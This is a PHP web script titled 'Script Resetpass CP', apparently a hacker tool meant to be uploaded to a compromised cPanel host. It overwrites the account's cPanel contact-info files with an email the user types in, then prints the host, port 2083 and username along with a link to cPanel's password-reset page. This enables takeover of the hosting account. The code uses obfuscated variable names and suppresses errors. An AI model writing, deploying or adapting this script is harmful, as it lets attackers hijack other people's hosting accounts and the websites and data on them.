<?php
error_reporting(0);
ini_set('max_execution_time',0);


echo '<html>
    <head> 
	      <title>Script Resetpass CP</title>
	      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		  <style>
.button {
  position: relative;
  display: block;
  width: 200px;
  height: 36px;
  border-radius: 18px;
  background-color: #000000;
  border: solid 1px transparent;
  color: #fff;
  font-size: 18px;
  font-weight: 300;
  cursor: pointer;
  transition: all .1s ease-in-out;
  &:hover {
    background-color: transparent;
    border-color: #fff;
    transition: all .1s ease-in-out;
  }

  

		  </style>
      	</head>
     <body>
	 <!--SCC -->
       <center> 	 
	   
    <p><h1 style="font: 20pt cursive;">Script Resetpass CP</h1></p>
	<p>   
	    <form action="#" method="post">
	    <br>
	<input type="email" name="email"class="button" placeholder="Your Email" />
	<br>
	<input type="submit" name="submit"class="button" value="Save"/>
	</form>

	
	<br /><br /><br />
	</p>
	</div>
   </center>
    </body>
</html>';
$IIIIIIIIIIII = get_current_user();
$IIIIIIIIIII1 = $_SERVER['HTTP_HOST'];
$IIIIIIIIIIlI = getenv('REMOTE_ADDR');
if (isset($_POST['submit'])) {
    $email = $_POST['email'];
    $IIIIIIIIIIl1 = 'email:' . $email;
    $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w');
    fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
    fclose($IIIIIIIIII1I);
    $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w');
    fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
    fclose($IIIIIIIIII1I);
    $IIIIIIIIIlIl = "https://";
    $IIIIIIIIIlI1 = "2083";
    $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1';
    echo "<center>Copy This </center>";
    echo '<center><input type="text" value="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIII1 . ':' . $IIIIIIIIIlI1 . '|' . $IIIIIIIIIIII . '|" id="cp">

<button onclick="cpfull()">Copy text</button></center>
 <script>function cpfull() {
 
  var copyText = document.getElementById("cp");

  copyText.select();

  document.execCommand("copy");

}
</script>
';
    echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user">

<button onclick="username()">Copy text</button ></center>
 <script>function username() {
 
  var copyText = document.getElementById("user");

  copyText.select();

  document.execCommand("copy");

}
</script>
';
    echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">RESET</a></center>';
};
?>
